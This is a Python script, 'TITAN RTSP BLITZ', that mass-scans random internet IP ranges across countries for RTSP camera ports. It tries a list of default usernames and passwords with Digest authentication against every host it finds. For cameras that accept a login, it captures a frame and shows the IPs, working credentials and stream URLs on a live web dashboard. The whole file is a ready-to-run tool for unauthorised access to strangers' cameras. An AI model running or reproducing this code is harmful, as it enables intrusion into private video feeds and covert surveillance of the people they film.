#!/usr/bin/env python3
"""
TITAN RTSP BLITZ — Find 100 live RTSP streams as fast as possible.

Strategy:
  1. Async port scan thousands of IPs on port 554 (primary RTSP)
  2. For open ports, do raw RTSP DESCRIBE with top-5 cred/path combos (socket-level, no ffprobe)
  3. If DESCRIBE returns 200 OK → it's a valid live stream
  4. Optionally grab one frame with ffmpeg for thumbnail
  5. Live HTML dashboard on port 7702 auto-refreshes
"""

import asyncio
import base64
import ipaddress
import json
import os
import random
import re
import socket
import subprocess
import sys
import threading
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path

BASE = Path(__file__).resolve().parent
FRAMES = BASE / "blitz_frames"
RESULTS = BASE / "results"
FRAMES.mkdir(exist_ok=True)
RESULTS.mkdir(exist_ok=True)

sys.path.insert(0, str(BASE))
from cctv_config import GLOBAL_CIDRS

# ── Fast credential + path combos (highest hit-rate first) ──
FAST_COMBOS = [
    ("", "",           "/"),
    ("admin", "",      "/Streaming/Channels/101"),
    ("admin", "12345", "/Streaming/Channels/101"),
    ("admin", "admin", "/stream1"),
    ("admin", "",      "/cam/realmonitor?channel=1&subtype=0"),
    ("admin", "12345", "/cam/realmonitor?channel=1&subtype=0"),
    ("admin", "123456","/cam/realmonitor?channel=1&subtype=0"),
    ("admin", "",      "/live"),
    ("admin", "admin", "/live"),
    ("admin", "",      "/h264/ch1/main/av_stream"),
    ("admin", "12345", "/h264/ch1/main/av_stream"),
    ("admin", "",      "/0"),
    ("admin", "",      "/1"),
    ("admin", "",      "/onvif1"),
    ("admin", "",      "/stream"),
    ("root",  "",      "/live.sdp"),
    ("root",  "pass",  "/axis-media/media.amp"),
    ("admin", "888888","/"),
    ("admin", "666666","/"),
    ("admin", "",      "/videoMain"),
    ("admin", "admin", "/"),
    ("admin", "1234",  "/stream1"),
    ("root",  "root",  "/live"),
    ("admin", "password", "/stream1"),
]

# ── Globals ──
LIVE_STREAMS = []
LOCK = threading.Lock()
TARGET = 100
HTTP_PORT = 7702
STATS = {
    "ips_scanned": 0,
    "ports_open": 0,
    "rtsp_probed": 0,
    "rtsp_valid": 0,
    "frames_grabbed": 0,
    "round": 0,
    "status": "initializing",
    "start_time": None,
}
DASHBOARD_PATH = BASE / "blitz_stream.html"


# ═══════════════════════════════════════════════════════════
# IP GENERATOR — weighted random from CIDRs
# ═══════════════════════════════════════════════════════════

def generate_ips(cidrs, count):
    nets = [ipaddress.ip_network(c, strict=False) for c in cidrs if '/' in c]
    weights = [n.num_addresses for n in nets]
    ips = set()
    while len(ips) < count:
        net = random.choices(nets, weights=weights, k=1)[0]
        if net.num_addresses > 2:
            off = random.randint(1, net.num_addresses - 2)
            ip = str(net.network_address + off)
            if not ip.endswith((".0", ".255")):
                ips.add(ip)
    return list(ips)


# ═══════════════════════════════════════════════════════════
# ASYNC PORT SCANNER — massively parallel TCP connect
# ═══════════════════════════════════════════════════════════

async def check_port(ip, port, sem, timeout=0.8):
    async with sem:
        try:
            _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout)
            w.close()
            await w.wait_closed()
            return ip
        except Exception:
            return None

async def mass_port_scan(ips, port=554, concurrency=3000, timeout=0.8):
    sem = asyncio.Semaphore(concurrency)
    tasks = [check_port(ip, port, sem, timeout) for ip in ips]
    results = await asyncio.gather(*tasks)
    return [ip for ip in results if ip]


# ═══════════════════════════════════════════════════════════
# RAW RTSP DESCRIBE — socket-level, no external tools
# ═══════════════════════════════════════════════════════════

import hashlib

def _digest_response(user, pwd, realm, nonce, method, uri):
    """Compute RTSP Digest auth response."""
    ha1 = hashlib.md5(f"{user}:{realm}:{pwd}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    return hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()


async def async_rtsp_probe(ip, port, user, pwd, path, timeout=2.0):
    """Async RTSP DESCRIBE with Digest auth handling. Returns cam dict or None."""
    url = f"rtsp://{ip}:{port}{path}"
    describe = (
        f"DESCRIBE {url} RTSP/1.0\r\n"
        f"CSeq: 2\r\n"
        f"Accept: application/sdp\r\n"
        f"User-Agent: LibVLC/3.0.18\r\n"
        f"\r\n"
    )
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout)
        w.write(describe.encode())
        await w.drain()
        data = await asyncio.wait_for(r.read(2048), timeout=timeout)
        resp = data.decode(errors="ignore")

        if "RTSP/1.0 200" in resp:
            w.close()
            return {"ip": ip, "port": port, "rtsp_url": url,
                    "user": "", "password": "", "path": path,
                    "timestamp": datetime.now().isoformat(), "sdp_snippet": resp[:300]}

        # Handle 401 → Digest auth
        if "401" in resp and "Digest" in resp and user:
            realm_m = re.search(r'realm="([^"]*)"', resp)
            nonce_m = re.search(r'nonce="([^"]*)"', resp)
            if realm_m and nonce_m:
                realm = realm_m.group(1)
                nonce = nonce_m.group(1)
                digest_resp = _digest_response(user, pwd, realm, nonce, "DESCRIBE", url)
                auth_describe = (
                    f"DESCRIBE {url} RTSP/1.0\r\n"
                    f"CSeq: 3\r\n"
                    f"Accept: application/sdp\r\n"
                    f"User-Agent: LibVLC/3.0.18\r\n"
                    f'Authorization: Digest username="{user}", realm="{realm}", '
                    f'nonce="{nonce}", uri="{url}", response="{digest_resp}"\r\n'
                    f"\r\n"
                )
                w.write(auth_describe.encode())
                await w.drain()
                data2 = await asyncio.wait_for(r.read(2048), timeout=timeout)
                resp2 = data2.decode(errors="ignore")
                if "RTSP/1.0 200" in resp2:
                    w.close()
                    auth_url = f"rtsp://{user}:{pwd}@{ip}:{port}{path}"
                    return {"ip": ip, "port": port, "rtsp_url": auth_url,
                            "user": user, "password": pwd, "path": path,
                            "timestamp": datetime.now().isoformat(), "sdp_snippet": resp2[:300]}
        w.close()
    except Exception:
        pass
    return None


async def async_probe_host(ip, port, sem):
    """Try combos on a host — first no-auth paths, then auth combos."""
    async with sem:
        # Phase 1: Try common paths without auth (fastest)
        no_auth_paths = ["/", "/live", "/stream1", "/Streaming/Channels/101",
                         "/cam/realmonitor?channel=1&subtype=0", "/0", "/1",
                         "/h264/ch1/main/av_stream", "/onvif1", "/live.sdp"]
        tasks = [asyncio.create_task(async_rtsp_probe(ip, port, "", "", p)) for p in no_auth_paths]
        done, pending = await asyncio.wait(tasks, timeout=3.0, return_when=asyncio.FIRST_COMPLETED)
        for t in done:
            r = t.result()
            if r:
                for p in pending:
                    p.cancel()
                return r
        for p in pending:
            p.cancel()

        # Phase 2: Top credential combos with Digest auth
        auth_combos = [
            ("admin", "",      "/Streaming/Channels/101"),
            ("admin", "12345", "/Streaming/Channels/101"),
            ("admin", "admin", "/stream1"),
            ("admin", "123456","/cam/realmonitor?channel=1&subtype=0"),
            ("admin", "",      "/cam/realmonitor?channel=1&subtype=0"),
            ("admin", "888888","/"),
            ("admin", "666666","/"),
            ("admin", "12345", "/h264/ch1/main/av_stream"),
            ("admin", "1234",  "/stream1"),
            ("admin", "admin", "/live"),
            ("root",  "",      "/live.sdp"),
            ("root",  "pass",  "/axis-media/media.amp"),
            ("admin", "password", "/"),
            ("root",  "root",  "/live"),
            ("admin", "Admin123", "/Streaming/Channels/101"),
        ]
        tasks2 = [asyncio.create_task(async_rtsp_probe(ip, port, u, p, path)) for u, p, path in auth_combos]
        done2, pending2 = await asyncio.wait(tasks2, timeout=4.0, return_when=asyncio.FIRST_COMPLETED)
        for t in done2:
            r = t.result()
            if r:
                for p in pending2:
                    p.cancel()
                return r
        for p in pending2:
            p.cancel()
    return None


async def async_probe_all(hosts, port=554, concurrency=400):
    """Probe all hosts with async RTSP DESCRIBE + Digest auth."""
    sem = asyncio.Semaphore(concurrency)
    tasks = [async_probe_host(ip, port, sem) for ip in hosts]
    results = await asyncio.gather(*tasks)
    return [r for r in results if r]


# ═══════════════════════════════════════════════════════════
# FRAME GRABBER — optional thumbnail via ffmpeg
# ═══════════════════════════════════════════════════════════

def grab_frame(cam):
    """Capture one frame from a valid RTSP URL."""
    safe = cam["ip"].replace(".", "_")
    fpath = str(FRAMES / f"cam_{safe}_{cam['port']}.jpg")
    try:
        r = subprocess.run(
            ["ffmpeg", "-y", "-rtsp_transport", "tcp",
             "-stimeout", "4000000", "-i", cam["rtsp_url"],
             "-vframes", "1", "-vf", "scale=640:-1",
             "-f", "image2", fpath],
            capture_output=True, timeout=6, text=True,
        )
        if r.returncode == 0 and os.path.isfile(fpath) and os.path.getsize(fpath) > 2000:
            cam["frame_file"] = fpath
            cam["frame_size"] = os.path.getsize(fpath)
            with open(fpath, "rb") as f:
                cam["frame_b64"] = base64.b64encode(f.read()).decode()
            # Extract resolution from ffmpeg stderr
            res = re.search(r"(\d{2,5})x(\d{2,5})", r.stderr)
            cam["resolution"] = f"{res.group(1)}x{res.group(2)}" if res else "?"
            return True
    except Exception:
        pass
    cam["frame_b64"] = ""
    cam["resolution"] = "?"
    return False


# ═══════════════════════════════════════════════════════════
# MAIN HUNT LOOP
# ═══════════════════════════════════════════════════════════

def hunt(all_cidrs, batch_size=20000, probe_workers=120):  # probe_workers unused now (fully async)
    STATS["status"] = "hunting"
    STATS["start_time"] = time.time()

    while len(LIVE_STREAMS) < TARGET:
        STATS["round"] += 1
        rnd = STATS["round"]

        # Generate random IPs
        ips = generate_ips(all_cidrs, batch_size)
        STATS["ips_scanned"] += len(ips)

        print(f"\n[R{rnd:>3}] Scanning {len(ips):,} IPs | found={len(LIVE_STREAMS)}/{TARGET}")

        # Async port scan on 554
        loop = asyncio.new_event_loop()
        try:
            open_hosts = loop.run_until_complete(mass_port_scan(ips, port=554, concurrency=3000))
        finally:
            loop.close()

        if not open_hosts:
            print(f"  → 0 open ports")
            continue

        STATS["ports_open"] += len(open_hosts)
        print(f"  → {len(open_hosts)} hosts with port 554 open. Async RTSP probing...")

        # Fully async RTSP DESCRIBE probing — all combos in parallel per host
        STATS["rtsp_probed"] += len(open_hosts)
        loop2 = asyncio.new_event_loop()
        try:
            valid_cams = loop2.run_until_complete(async_probe_all(open_hosts, port=554, concurrency=500))
        finally:
            loop2.close()

        for cam in valid_cams:
            if len(LIVE_STREAMS) >= TARGET:
                break
            STATS["rtsp_valid"] += 1
            # Grab frame in background thread to not block
            got_frame = grab_frame(cam)
            if got_frame:
                STATS["frames_grabbed"] += 1
            with LOCK:
                LIVE_STREAMS.append(cam)
            elapsed = time.time() - STATS["start_time"]
            print(f"  ✅ #{len(LIVE_STREAMS):>3}  {cam['ip']:>15}:554  path={cam['path']:<40}  res={cam.get('resolution','?'):<10}  [{elapsed:.0f}s]")
            if len(LIVE_STREAMS) % 5 == 0:
                save_results()
                regen_dashboard()

        # Also try port 8554 on a subset
        if len(LIVE_STREAMS) < TARGET:
            loop3 = asyncio.new_event_loop()
            try:
                open_8554 = loop3.run_until_complete(mass_port_scan(ips[:8000], port=8554, concurrency=2000))
                if open_8554:
                    STATS["ports_open"] += len(open_8554)
                    STATS["rtsp_probed"] += len(open_8554)
                    valid_8554 = loop3.run_until_complete(async_probe_all(open_8554, port=8554, concurrency=300))
                    for cam in valid_8554:
                        if len(LIVE_STREAMS) >= TARGET:
                            break
                        STATS["rtsp_valid"] += 1
                        grab_frame(cam)
                        with LOCK:
                            LIVE_STREAMS.append(cam)
                        print(f"  ✅ #{len(LIVE_STREAMS):>3}  {cam['ip']:>15}:8554  path={cam['path']}")
                        if len(LIVE_STREAMS) % 5 == 0:
                            save_results()
                            regen_dashboard()
            finally:
                loop3.close()

        # Also try port 37777 (Dahua) on a subset
        if len(LIVE_STREAMS) < TARGET:
            loop4 = asyncio.new_event_loop()
            try:
                open_37777 = loop4.run_until_complete(mass_port_scan(ips[:5000], port=37777, concurrency=2000))
                if open_37777:
                    STATS["ports_open"] += len(open_37777)
                    # Dahua on 37777 sometimes speaks RTSP on 554 — also try 554 on those IPs
                    dahua_554 = loop4.run_until_complete(async_probe_all([ip for ip in open_37777 if ip not in set(open_hosts)], port=554, concurrency=200))
                    for cam in dahua_554:
                        if len(LIVE_STREAMS) >= TARGET:
                            break
                        STATS["rtsp_valid"] += 1
                        grab_frame(cam)
                        with LOCK:
                            LIVE_STREAMS.append(cam)
                        print(f"  ✅ #{len(LIVE_STREAMS):>3}  {cam['ip']:>15}:554  path={cam['path']} (dahua hint)")
            finally:
                loop4.close()

    STATS["status"] = "complete"
    save_results()
    regen_dashboard()
    elapsed = time.time() - STATS["start_time"]
    print(f"\n{'='*70}")
    print(f"  COMPLETE — {len(LIVE_STREAMS)} live RTSP streams found in {elapsed:.0f}s")
    print(f"{'='*70}")


# ═══════════════════════════════════════════════════════════
# DASHBOARD
# ═══════════════════════════════════════════════════════════

def regen_dashboard():
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    elapsed = time.time() - (STATS["start_time"] or time.time())
    rate = STATS["rtsp_valid"] / max(elapsed, 1) * 60

    cards = ""
    for i, c in enumerate(LIVE_STREAMS):
        b64 = c.get("frame_b64", "")
        img = f'<img src="data:image/jpeg;base64,{b64}" style="width:100%;border-radius:6px;margin-top:6px;">' if b64 else '<div style="height:120px;background:#222;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#555;font-size:12px;">No thumbnail</div>'
        cards += f'''
        <div style="background:#1a1a2e;border:1px solid #0f0;border-radius:8px;padding:10px;margin:6px;width:280px;">
            <div style="color:#0f0;font-weight:bold;font-size:13px;">#{i+1} — {c["ip"]}:{c["port"]}</div>
            {img}
            <div style="font-size:11px;color:#aaa;margin-top:6px;">
                Path: <code style="color:#0ff;">{c.get("path","?")}</code><br>
                Resolution: {c.get("resolution","?")}<br>
                Creds: {c.get("user","?")}:{c.get("password","?")}<br>
                <span style="color:#0ff;font-size:9px;word-break:break-all;">{c.get("rtsp_url","")}</span>
            </div>
        </div>'''

    html = f'''<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>TITAN RTSP BLITZ — Live</title>
<meta http-equiv="refresh" content="10">
<style>
body{{background:#0a0a15;color:#eee;font-family:'Courier New',monospace;margin:0;padding:20px;}}
code{{background:#000;padding:2px 4px;border-radius:3px;}}
.stat{{display:inline-block;background:#111;padding:8px 14px;border-radius:6px;margin:4px;border:1px solid #333;}}
.stat b{{color:#0f0;}}
</style></head>
<body>
<h1 style="color:#f00;margin-bottom:5px;">⚡ TITAN RTSP BLITZ — LIVE STREAM HUNTER</h1>
<p style="color:#666;margin-top:0;">Finding 100 live RTSP camera streams worldwide</p>
<div style="margin-bottom:20px;">
  <span class="stat">Status: <b>{STATS["status"].upper()}</b></span>
  <span class="stat">IPs Scanned: <b>{STATS["ips_scanned"]:,}</b></span>
  <span class="stat">Open Ports: <b>{STATS["ports_open"]:,}</b></span>
  <span class="stat">RTSP Probed: <b>{STATS["rtsp_probed"]:,}</b></span>
  <span class="stat" style="border-color:#0f0;">Live Streams: <b style="font-size:18px;">{len(LIVE_STREAMS)} / {TARGET}</b></span>
  <span class="stat">Frames: <b>{STATS["frames_grabbed"]}</b></span>
  <span class="stat">Rounds: <b>{STATS["round"]}</b></span>
  <span class="stat">Rate: <b>{rate:.1f}/min</b></span>
  <span class="stat">Elapsed: <b>{elapsed:.0f}s</b></span>
  <span class="stat">Updated: <b>{ts}</b></span>
</div>
<div style="width:100%;background:#111;border-radius:8px;height:24px;margin-bottom:20px;overflow:hidden;">
  <div style="background:linear-gradient(90deg,#0f0,#0ff);height:100%;width:{min(100, len(LIVE_STREAMS))}%;transition:width 0.5s;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:bold;color:#000;font-size:12px;">
    {len(LIVE_STREAMS)}%
  </div>
</div>
<h2 style="color:#0f0;">Live Streams ({len(LIVE_STREAMS)})</h2>
<div style="display:flex;flex-wrap:wrap;">{cards}</div>
</body></html>'''
    DASHBOARD_PATH.write_text(html)


def save_results():
    out = {
        "timestamp": datetime.now().isoformat(),
        "stats": STATS,
        "streams": [
            {k: c.get(k) for k in ["ip", "port", "rtsp_url", "user", "password", "path", "resolution", "timestamp"]}
            for c in LIVE_STREAMS
        ],
    }
    with open(RESULTS / "rtsp_blitz_live.json", "w") as f:
        json.dump(out, f, indent=2, default=str)


# ═══════════════════════════════════════════════════════════
# HTTP SERVER
# ═══════════════════════════════════════════════════════════

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/stats":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            data = {"stats": STATS, "found": len(LIVE_STREAMS), "target": TARGET,
                    "streams": [{"ip": c["ip"], "port": c["port"], "url": c["rtsp_url"], "res": c.get("resolution","?")} for c in LIVE_STREAMS]}
            self.wfile.write(json.dumps(data, default=str).encode())
        elif DASHBOARD_PATH.exists():
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(DASHBOARD_PATH.read_bytes())
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body style='background:#000;color:#0f0;'><h1>RTSP BLITZ starting...</h1></body></html>")

    def log_message(self, fmt, *args):
        pass

def start_server(port):
    srv = HTTPServer(('0.0.0.0', port), Handler)
    print(f"[HTTP] Dashboard: http://localhost:{port}")
    srv.serve_forever()


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--target", type=int, default=100)
    p.add_argument("--port", type=int, default=7702)
    p.add_argument("--batch", type=int, default=20000)
    p.add_argument("--workers", type=int, default=120)
    args = p.parse_args()

    TARGET = args.target
    all_cidrs = [c for country in GLOBAL_CIDRS.values() for c in country]
    print(f"[INIT] {len(all_cidrs)} CIDRs across {len(GLOBAL_CIDRS)} countries")

    regen_dashboard()

    # HTTP dashboard in background
    threading.Thread(target=start_server, args=(args.port,), daemon=True).start()

    print(f"\n{'='*70}")
    print(f"  ⚡ TITAN RTSP BLITZ — Find {TARGET} live streams")
    print(f"  Batch: {args.batch} IPs | Workers: {args.workers} | Dashboard: http://localhost:{args.port}")
    print(f"{'='*70}\n")

    try:
        hunt(all_cidrs, batch_size=args.batch, probe_workers=args.workers)
    except KeyboardInterrupt:
        print(f"\nStopped. {len(LIVE_STREAMS)} streams found.")
    finally:
        save_results()
        regen_dashboard()
        print(f"Results saved to {RESULTS / 'rtsp_blitz_live.json'}")
        print(f"Dashboard: {DASHBOARD_PATH}")
